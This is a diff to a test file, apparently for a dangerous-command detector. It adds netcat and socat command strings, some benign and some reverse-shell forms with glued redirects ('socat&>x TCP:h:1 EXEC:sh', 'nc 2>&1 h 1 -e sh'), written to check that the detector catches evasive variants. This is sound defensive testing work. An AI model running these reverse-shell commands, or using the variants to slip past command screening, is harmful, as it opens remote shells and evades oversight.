@@ -45,6 +45,9 @@ def test_reverse_shell_requires_approval(command):
     "nc -vC host 25",
     "ncat -vC host 25",
     "nc-wrapper -e foo",
+    "nc -z h 80 &>/dev/null && echo -e ok",
+    "socat - TCP:h:80 &>log; echo exec:x",
+    "socat&x TCP:h:1 EXEC:sh",
     "socat - TCP:localhost:80 # exec: plain forwarding",
 ])
 def test_reverse_shell_prose_and_plain_netcat_not_flagged(command):
@@ -67,6 +70,12 @@ def test_socat_prefix_executable_does_not_need_reverse_shell_approval():
     "ncat<x h 1 -e sh",
     "nc>>x h 1 -e sh",
     "/usr/bin/netcat>x h 1 -e sh",
+    "socat&>x TCP:h:1 EXEC:sh",
+    "socat 2>&1 TCP:h:1 EXEC:sh",
+    "socat TCP:h:1 <&0 EXEC:sh",
+    "nc&>x h 1 -e sh",
+    "nc 2>&1 h 1 -e sh",
+    "nc h 1 2>&1 -e sh",
 ])
 def test_reverse_shell_with_glued_redirect_requires_approval(command):
     assert detect_dangerous_command(command)[0] is True
